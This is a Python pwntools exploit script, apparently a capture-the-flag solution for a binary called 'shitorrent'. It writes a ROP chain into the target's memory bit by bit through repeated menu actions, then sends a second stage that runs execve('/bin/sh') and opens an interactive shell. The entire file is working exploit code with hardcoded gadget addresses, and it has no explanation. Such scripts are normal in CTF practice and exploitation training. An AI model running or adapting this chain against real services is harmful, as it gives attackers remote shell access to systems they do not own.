from pwn import *
import sys, os
import random

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./shitorrent"

LOCAL = False

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})
  LOCAL = True


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

#context.log_level = 'debug'

def rr ():
  r.recvuntil ("]et flag\n")

def menu (idx):
  rr ()
  r.sendline ((idx))



target = 0x6dda00

ret80 = 0x000000000044efae
prdi = 0x0000000000400706
prsi = 0x0000000000407888
prdx = 0x0000000000465855
prsp = 0x0000000000403368
prax = 0x00000000004657fc
bss = 0x6dda00
syscall = 0x00000000004172e5
nop = 0x0000000000400416
mainret= 0x000000000041c449
io_read = 0x00000000042FE00 
read = 0x465840

pay = p64(prdi) + p64(0) + p64(prsi)+ p64(bss) + p64(prdx) + p64(0x200) + p64(read) +  p64(prsp) + p64(bss + 0x10) 
print hex(len (pay))

#pay = pay.ljust (0x88, "A") + p64 (0) * 2 + p64 (ret80)

binlist = ''.join ([bin(ord(c))[2:].rjust (8, '0')[::-1] for c in pay])
print len (binlist)
print binlist


pay2 = "/bin/sh\x00" + p64(nop) * 4 + p64 (prax) + p64 (59) + p64(prdi)+ p64 (target) + p64(prsi) + p64 (0) + p64 (prdx) + p64 (0) + p64(syscall)

pp = ""

for _ in range (1216-3 + len(pay) * 8):
  
  if LOCAL: rr ()
  r.sendline ('a')
  #r.send'206.189.220.67\x00'.ljust (99, "\x41"))
  r.send('127.0.0.1\x00'.ljust (99, "\x41"))
  r.send('9099\x00'.ljust (99, "\x41"))
  print _



for _ in range (len(pay)*8):

    if (binlist[_] == '0'):
        if LOCAL: rr ()
        r.sendline('r')
        r.send (str(_+1216).ljust (0xff, "\x00"))

r.sendline ('q')
r.send (pay2.ljust (0x200, "\x00"))
r.interactive ()
